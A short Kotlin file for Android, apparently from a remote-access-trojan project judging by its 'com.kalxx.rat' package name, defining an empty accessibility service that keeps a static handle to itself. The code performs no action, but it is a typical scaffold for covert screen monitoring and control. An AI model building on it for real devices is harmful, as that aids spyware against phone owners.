package com.kalxx.rat
import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

class BlockService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() {}
    override fun onServiceConnected() { instance = this }
    companion object { var instance: BlockService? = null }
}
